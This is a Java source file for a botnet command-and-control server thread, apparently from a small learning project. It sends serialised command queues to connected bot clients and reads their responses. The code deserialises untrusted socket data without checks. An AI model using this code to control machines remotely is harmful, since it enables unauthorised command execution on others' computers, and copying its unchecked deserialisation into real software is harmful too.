import java.net.*;
import java.io.*;

/**
 * BotnetServer Class:
 * User facing object used to create and send command objects to client for execution
 */
public class BotnetServerThread extends Thread{
    // Properties
    private Socket socket;
    private CommandQueue queue;
    private Boolean status = true;
    
    final private String MENU = "\n------\nEnter a Command name \n1)open app\n2)status\n3)exit\n------";

    //Constructor
    public BotnetServerThread(Socket socket, CommandQueue queue){
        super();
        this.socket = socket;
        this.queue = queue;
        
    }
    
    public Socket printName(){
        return this.socket;
    }

    public CommandQueue returnQueue(){
        return this.queue;
    }

    public void updateQueue(CommandQueue queue){
        this.queue = queue;
    }

    public boolean returnStatus(){
        return this.status;
    }
    
    public CommandQueue sendQueue() {
        try {
            //input and output streams for the buffer and socket
            ObjectOutputStream out = new ObjectOutputStream(socket.getOutputStream());
            ObjectInputStream in = new ObjectInputStream(socket.getInputStream());
            
            //**WHILE YOU CAN READ objects FROM THE socket STREAM */
            // while (this.queue != null){
            
            out.writeObject(this.queue);
            out.flush();

            this.queue = (CommandQueue) in.readObject();

            Command inCommand = this.queue.take();
            //Print the response of the command that was processed by the client
            // System.out.println("[+]Client: " + inCommand.getResponse());
            //*If the output is bye close connection */
            if (inCommand.getResponse().equalsIgnoreCase("exiting")){
                System.out.println("[+]Closing connection");
                this.status = false;
                socket.close();
                in.close();
                out.close();
                System.exit(0);
                // break;
            }
            out.writeObject(this.queue);
            
            // }
            //*CLOSE CONNECTION IF YOU ARE DONE */
            // socket.close();
            // in.close();
            // out.close();

        //Error handle for if the class is not found or if there is an IO interuption
        } catch (ClassNotFoundException e){
            System.err.println("[-]IMClient Class not found");
            System.exit(1);
        }
        catch(SocketException e){
            System.err.println("[-]Client disconnected");
            return null;
        }
         catch (IOException e) {
            e.printStackTrace();
        }
        return this.queue;
    }
}